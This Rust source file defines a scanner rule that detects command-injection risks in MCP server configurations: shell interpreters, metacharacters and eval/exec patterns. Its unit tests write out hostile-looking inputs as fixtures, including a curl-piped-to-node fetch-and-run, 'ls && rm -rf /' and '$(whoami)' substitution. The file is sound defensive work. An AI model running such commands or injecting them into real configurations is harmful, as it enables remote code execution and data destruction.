//! MCP-07: Command Injection
//!
//! Detects MCP server configurations vulnerable to command injection through
//! shell interpreters, metacharacters in arguments, and unsafe eval/exec patterns.

use crate::monitors::Severity;
use crate::parser::McpServerConfig;
use crate::scanner::ScanFinding;

/// Shell interpreters that allow arbitrary command execution.
const SHELL_COMMANDS: &[&str] = &[
    "sh",
    "bash",
    "zsh",
    "fish",
    "csh",
    "tcsh",
    "ksh",
    "dash",
    "cmd",
    "cmd.exe",
    "powershell",
    "powershell.exe",
    "pwsh",
];

/// Shell metacharacters that enable command chaining or injection.
const SHELL_METACHARACTERS: &[(&str, &str)] = &[
    (";", "command separator"),
    ("&&", "command chaining (AND)"),
    ("||", "command chaining (OR)"),
    ("|", "pipe (command output redirection)"),
    ("$(", "command substitution"),
    ("`", "backtick command substitution"),
    (">(", "process substitution"),
    ("<(", "process substitution"),
    (">>", "append redirection"),
];

/// Patterns indicating eval/exec usage.
const EVAL_PATTERNS: &[(&str, &str)] = &[
    ("eval ", "shell eval"),
    ("eval(", "eval expression"),
    ("exec(", "exec expression"),
    ("exec ", "exec command"),
    ("system(", "system() call"),
    ("os.system", "Python os.system()"),
    ("subprocess.call", "Python subprocess"),
    ("subprocess.run", "Python subprocess"),
    ("child_process", "Node.js child_process"),
    ("Runtime.exec", "Java Runtime.exec()"),
];

pub struct CommandInjectionRule;

impl super::Rule for CommandInjectionRule {
    fn id(&self) -> &'static str {
        "MCP-07"
    }

    fn name(&self) -> &'static str {
        "Command Injection"
    }

    fn description(&self) -> &'static str {
        "Detects MCP server configurations vulnerable to command injection \
         through shell interpreters, metacharacters, and eval/exec patterns."
    }

    fn default_severity(&self) -> Severity {
        Severity::Critical
    }

    fn owasp_id(&self) -> &'static str {
        "OWASP-MCP-07"
    }

    fn check(&self, server_name: &str, server: &McpServerConfig) -> Vec<ScanFinding> {
        let mut findings = Vec::new();
        let cmd = server.command.as_deref().unwrap_or("");
        let args = server.args.as_deref().unwrap_or(&[]);
        let args_str = server.args_string();

        // Check if the command itself is a shell interpreter.
        let cmd_basename = cmd.rsplit('/').next().unwrap_or(cmd);
        let cmd_basename = cmd_basename.rsplit('\\').next().unwrap_or(cmd_basename);

        if SHELL_COMMANDS.contains(&cmd_basename) {
            findings.push(ScanFinding {
                rule_id: self.id().to_string(),
                severity: Severity::Critical,
                title: format!(
                    "Shell interpreter used as command in server '{}'",
                    server_name
                ),
                description: format!(
                    "Server uses '{}' as the command, which is a shell interpreter. \
                     This allows arbitrary command execution. Use a specific binary \
                     or runtime (e.g., 'node', 'python') instead of a shell.",
                    cmd
                ),
            });

            // If shell is used with -c flag, check what's being executed.
            let has_c_flag = args.iter().any(|a| a == "-c" || a == "/c" || a == "/C");
            if has_c_flag {
                let shell_cmd = args
                    .iter()
                    .find(|a| !(*a == "-c" || *a == "/c" || *a == "/C" || a.starts_with('-')))
                    .map(|s| s.as_str())
                    .unwrap_or("");

                // Check for eval/exec in the shell command.
                for (pattern, desc) in EVAL_PATTERNS {
                    if shell_cmd.contains(pattern) {
                        findings.push(ScanFinding {
                            rule_id: self.id().to_string(),
                            severity: Severity::Critical,
                            title: format!("{} in shell command of server '{}'", desc, server_name),
                            description: format!(
                                "Shell command contains '{}' which is a dangerous {} pattern. \
                                 This can execute arbitrary code. Refactor to avoid \
                                 eval/exec patterns.",
                                pattern, desc
                            ),
                        });
                        break;
                    }
                }

                // Check for environment variable expansion in shell commands.
                if shell_cmd.contains('$') && !shell_cmd.contains("$'") {
                    findings.push(ScanFinding {
                        rule_id: self.id().to_string(),
                        severity: Severity::High,
                        title: format!(
                            "Variable expansion in shell command of server '{}'",
                            server_name
                        ),
                        description: "Shell command uses variable expansion ($VAR or ${VAR}) \
                             which can lead to injection if variables contain \
                             attacker-controlled data. Use proper quoting or avoid \
                             shell interpreters."
                            .to_string(),
                    });
                }
            }
        }

        // Check arguments for shell metacharacters.
        for arg in args {
            for (meta, desc) in SHELL_METACHARACTERS {
                // Skip single pipe in common non-injection contexts.
                if *meta == "|" && arg.len() == 1 {
                    continue;
                }
                if arg.contains(meta) {
                    findings.push(ScanFinding {
                        rule_id: self.id().to_string(),
                        severity: Severity::High,
                        title: format!(
                            "Shell metacharacter in arguments of server '{}'",
                            server_name
                        ),
                        description: format!(
                            "Argument contains '{}' ({}). Shell metacharacters \
                             in arguments can enable command injection. Ensure arguments \
                             are properly escaped or use a non-shell command.",
                            meta, desc
                        ),
                    });
                    break; // One finding per argument.
                }
            }
        }

        // Check for eval/exec patterns in non-shell commands too.
        if !SHELL_COMMANDS.contains(&cmd_basename) {
            for (pattern, desc) in EVAL_PATTERNS {
                if args_str.contains(pattern) {
                    findings.push(ScanFinding {
                        rule_id: self.id().to_string(),
                        severity: Severity::High,
                        title: format!("{} pattern in server '{}' arguments", desc, server_name),
                        description: format!(
                            "Server arguments contain '{}' which may allow arbitrary code \
                             execution. Avoid eval/exec patterns in favor of direct \
                             function calls.",
                            pattern
                        ),
                    });
                    break;
                }
            }
        }

        findings
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::rules::Rule;

    fn check(cmd: &str, args: &[&str]) -> Vec<ScanFinding> {
        let rule = CommandInjectionRule;
        let server = McpServerConfig {
            command: Some(cmd.into()),
            args: Some(args.iter().map(|s| s.to_string()).collect()),
            ..Default::default()
        };
        rule.check("test-server", &server)
    }

    #[test]
    fn detects_shell_command() {
        let findings = check("sh", &["-c", "echo hello"]);
        assert!(
            findings
                .iter()
                .any(|f| f.title.contains("Shell interpreter")),
            "Should detect shell interpreter usage"
        );
    }

    #[test]
    fn detects_bash_command() {
        let findings = check("bash", &["-c", "curl http://example.com | node"]);
        assert!(
            findings.iter().any(|f| f.severity == Severity::Critical),
            "Should flag bash as critical"
        );
    }

    #[test]
    fn detects_eval_in_shell() {
        let findings = check("sh", &["-c", "eval $INPUT"]);
        assert!(
            findings.iter().any(|f| f.title.contains("eval")),
            "Should detect eval in shell command"
        );
    }

    #[test]
    fn detects_shell_metacharacters_in_args() {
        let findings = check("node", &["server.js", "--cmd", "ls && rm -rf /"]);
        assert!(
            findings.iter().any(|f| f.title.contains("metacharacter")),
            "Should detect shell metacharacters"
        );
    }

    #[test]
    fn detects_command_substitution() {
        let findings = check("node", &["server.js", "$(whoami)"]);
        assert!(
            findings.iter().any(|f| f.title.contains("metacharacter")),
            "Should detect command substitution"
        );
    }

    #[test]
    fn detects_backtick_substitution() {
        let findings = check("node", &["server.js", "`id`"]);
        assert!(
            findings.iter().any(|f| f.title.contains("metacharacter")),
            "Should detect backtick substitution"
        );
    }

    #[test]
    fn safe_command_passes() {
        let findings = check("node", &["server.js", "--port", "3000"]);
        assert!(
            findings.is_empty(),
            "Safe command should produce no findings"
        );
    }

    #[test]
    fn detects_powershell() {
        let findings = check("powershell", &["-c", "Get-Process"]);
        assert!(
            findings
                .iter()
                .any(|f| f.title.contains("Shell interpreter")),
            "Should detect PowerShell as shell interpreter"
        );
    }

    #[test]
    fn detects_variable_expansion_in_shell() {
        let findings = check("sh", &["-c", "echo $USER_INPUT"]);
        assert!(
            findings
                .iter()
                .any(|f| f.title.contains("Variable expansion")),
            "Should detect variable expansion in shell command"
        );
    }

    #[test]
    fn rule_metadata() {
        let rule = CommandInjectionRule;
        assert_eq!(rule.id(), "MCP-07");
        assert_eq!(rule.owasp_id(), "OWASP-MCP-07");
        assert_eq!(rule.default_severity(), Severity::Critical);
    }
}
